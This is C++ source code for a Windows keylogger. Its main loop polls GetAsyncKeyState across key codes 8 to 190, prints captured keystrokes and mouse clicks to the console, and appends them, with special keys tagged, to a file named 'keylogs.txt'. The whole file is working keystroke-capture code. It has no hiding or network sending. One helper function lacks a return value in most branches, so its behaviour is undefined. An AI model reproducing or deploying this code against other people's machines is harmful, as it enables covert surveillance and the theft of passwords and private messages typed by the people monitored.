#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>


void WriteToLog(LPCSTR text) {
    std::ofstream logfile;
    logfile.open("keylogs.txt", std::fstream::app);
    logfile << text;
    logfile.close();
}

bool KeyIsListed(int ikey) {
    switch (ikey) {
        case VK_SPACE:
            std::cout << " ";
            WriteToLog(" ");
            break;
        case VK_RETURN:
            std::cout << " *Enter* \n";
            WriteToLog(" *Enter* \n");
            break;
        case VK_SHIFT:
            std::cout << " *Shift* ";
            WriteToLog(" *Shift* ");
            break;
        case VK_CONTROL:
            std::cout << " *Ctrl* ";
            WriteToLog(" *Ctrl* ");
            break;
        case VK_TAB:
            std::cout << " *Tab* ";
            WriteToLog(" *Tab* ");
            break;
        case VK_MENU:
            std::cout << " *Alt* ";
            WriteToLog(" *Alt* ");
            break;
        case VK_CAPITAL:
            std::cout << " *CapsLock* ";
            WriteToLog(" *CapsLock* ");
            break;
        case VK_BACK:
            std::cout << "\b";
            WriteToLog("\b");
            break;
        case VK_RBUTTON:
            std::cout << " *rclick* ";
            WriteToLog(" *rclick* ");
            break;
        case VK_LBUTTON:
            std::cout << " *lclick* ";
            WriteToLog(" *lclick* ");
            break;
        default: return false;
        }
    //return false;
}


int main() {
    unsigned char key;
    while(TRUE) {
        Sleep(10);
        for (key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                if (KeyIsListed(key) == FALSE) {
                    std::cout << key;
                    std::ofstream logfile;
                    logfile.open("keylogs.txt", std::fstream::app);
                    logfile << key;
                    logfile.close();
                }
            }
        }
    }
    return 0;
}
